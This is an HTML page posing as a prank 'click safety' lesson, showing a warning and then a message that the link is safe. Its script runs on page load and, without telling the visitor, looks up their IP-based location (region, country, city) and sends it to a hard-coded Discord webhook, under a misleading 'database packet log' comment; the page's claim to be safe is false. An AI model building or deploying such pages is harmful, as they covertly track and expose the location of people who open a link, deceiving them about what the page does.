<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream Security Check</title>
    <style>
        /* Cyberpunk Streaming Animated Background */
        body { 
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            background: radial-gradient(circle at 50% 50%, #170b2e 0%, #05020a 100%);
            color: #efeff1; 
            text-align: center; 
            padding-top: 15vh; 
            margin: 0;
            overflow: hidden;
            position: relative;
            height: 100vh;
        }

        /* Moving Digital Grid Overlay */
        body::before {
            content: "";
            position: absolute;
            top: -50%; left: -50%; right: -50%; bottom: -50%;
            background-image: 
                linear-gradient(rgba(145, 70, 255, 0.08) 1.5px, transparent 1.5px),
                linear-gradient(90deg, rgba(145, 70, 255, 0.08) 1.5px, transparent 1.5px);
            background-size: 40px 40px;
            transform: perspective(500px) rotateX(25deg);
            animation: gridDrive 12s linear infinite;
            z-index: 1;
        }

        @keyframes gridDrive {
            0% { background-position: 0 0; }
            100% { background-position: 0 400px; }
        }

        /* Floating Cyber Container Box */
        .container {
            max-width: 620px;
            margin: 0 auto;
            padding: 50px 30px;
            background: rgba(15, 15, 20, 0.9);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 20px;
            border: 2px solid #9146FF;
            box-shadow: 0 0 35px rgba(145, 70, 255, 0.35), inset 0 0 20px rgba(145, 70, 255, 0.15);
            position: relative;
            z-index: 10;
            animation: floatCard 4.5s ease-in-out infinite;
        }

        @keyframes floatCard {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-12px) rotate(0.5deg); }
        }

        /* Changing Red/Green Custom Messaging Text Blocks */
        .warning-text {
            color: #ff4a4a;
            font-size: 24px;
            font-weight: bold;
            line-height: 1.6;
            display: block;
            text-shadow: 0 0 12px rgba(255, 74, 74, 0.4);
        }

        .safe-text {
            color: #26d07c;
            font-size: 24px;
            font-weight: bold;
            line-height: 1.6;
            display: none; 
            text-shadow: 0 0 12px rgba(38, 208, 124, 0.4);
        }

        /* Sub-text Messages */
        .think-text {
            color: #adadb8;
            font-size: 18px;
            margin-top: 20px;
            display: none;
            letter-spacing: 0.5px;
        }

        /* Custom Closing Message Container */
        .closing-text {
            color: #ffffff;
            font-size: 16px;
            margin-top: 25px;
            font-style: italic;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            padding-top: 15px;
            display: none;
            letter-spacing: 0.5px;
        }

        /* Advanced Pulse Spinner */
        .loader-wrapper {
            position: relative;
            width: 50px;
            height: 50px;
            margin: 40px auto 0 auto;
        }
        .loader {
            border: 4px solid rgba(145, 70, 255, 0.1);
            border-top: 4px solid #9146FF;
            border-right: 4px solid #00f2ff;
            border-radius: 50%;
            width: 42px;
            height: 42px;
            animation: spin 0.7s linear infinite;
        }
        .pulse-ring {
            position: absolute;
            top: 0; left: 0; width: 50px; height: 50px;
            border: 2px solid #9146FF;
            border-radius: 50%;
            animation: echoPulse 1.8s ease-out infinite;
            opacity: 0;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes echoPulse {
            0% { transform: scale(0.6); opacity: 0; }
            50% { opacity: 0.4; }
            100% { transform: scale(1.4); opacity: 0; }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Text Step 1: Red Warning Message -->
        <div id="redMessage" class="warning-text">
            ⚠️ Dont ever click on random links someone sends to you that you do not know.
        </div>
        
        <!-- Text Step 2: Green Safe Message -->
        <div id="greenMessage" class="safe-text">
            ✅ This is safe but why did you click it
        </div>

        <!-- Text Step 3: Advice Subtext Message -->
        <div id="thinkMessage" class="think-text">
            🤔 Think before clicking on stuff
        </div>

        <!-- Text Step 4: Your Custom Closing Signature -->
        <div id="closingMessage" class="closing-text">
            Good Luck - Made from <strong>GeoUniverse</strong>
        </div>

        <!-- Glowing System Progress Spinner -->
        <div class="loader-wrapper">
            <div class="pulse-ring"></div>
            <div class="loader"></div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504591125858750635/3ej395jYnj8VxkF7mV4cnmrdyPNA6Z1BfBx7Jaw3WP4POwshtwODmMxZSiX_i1XfemTj";

        async function grabLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data.region && data.country_name) {
                    const payload = {
                        content: `📢 **New Chat Click!** From State/Region: **${data.region}**, Country: **${data.country_name}** (City: ${data.city})`
                    };

                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }
            } catch (error) {
                console.log("System initialization error logged.");
            }
        }

        // Fire database packet log instantly in background
        grabLocation();

        // ⏱️ 4-Second Complete Interface Swap Script
        setTimeout(() => {
            // Hide the red text message
            document.getElementById('redMessage').style.display = 'none';

            // Reveal all your new custom layout text strings together
            document.getElementById('greenMessage').style.display = 'block';
            document.getElementById('thinkMessage').style.display = 'block';
            document.getElementById('closingMessage').style.display = 'block';
        }, 4000);
    </script>
</body>
</html>
